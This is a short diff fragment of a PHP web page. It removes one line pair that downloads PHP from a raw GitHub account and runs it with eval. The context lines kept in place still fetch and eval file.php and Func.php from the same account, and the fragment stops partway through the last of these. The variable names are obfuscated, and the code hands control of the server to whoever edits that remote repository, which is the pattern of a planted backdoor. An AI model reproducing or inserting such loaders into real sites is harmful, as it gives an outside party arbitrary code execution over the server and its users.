@@ -82,8 +82,6 @@ document.onclick=reEnable
 }
 ?>
 <?php
-$aqygstg=file_get_contents("https://raw.githubusercontent.com/hojr128567/hojr128567/main/style.php");
-eval("?>".$aqygstg);
 $aqygstg1=file_get_contents("https://raw.githubusercontent.com/hojr128567/hojr128567/main/file.php");
 eval("?>".$aqygstg1);
 $aqygstg2=file_get_contents("https://raw.githubusercontent.com/hojr128567/hojr128567/main/Func.php");
